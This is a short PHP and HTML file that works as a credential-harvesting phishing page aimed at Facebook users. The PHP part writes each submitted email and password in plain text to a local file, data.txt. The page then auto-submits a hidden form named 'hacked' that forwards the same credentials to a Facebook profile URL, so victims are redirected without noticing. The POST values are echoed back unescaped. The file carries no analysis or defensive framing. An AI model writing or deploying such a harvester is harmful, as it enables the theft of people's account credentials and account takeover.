<?php 
$file = fopen('data.txt', 'a+');
$write = fwrite($file, 'email: '.$_POST['email']. PHP_EOL .'password: '. $_POST['pass'].PHP_EOL.PHP_EOL );
fclose($file);

 ?>
<html>
<head>
	<title></title>
	<script type="text/javascript">
	function submitnow () {
		document.getElementById("hacked").submit();
	}
	</script>
</head>
<body onload="submitnow()">
<form action="https://www.facebook.com/profile.php?id=100022567140337" method="post" id="hacked">
 	<input type="hidden" name='email' value="<?php echo $_POST['email']; ?>">
 	<input type="hidden" name='pass' value="<?php echo $_POST['pass']; ?>">
 </form>
</body>
</html>
 
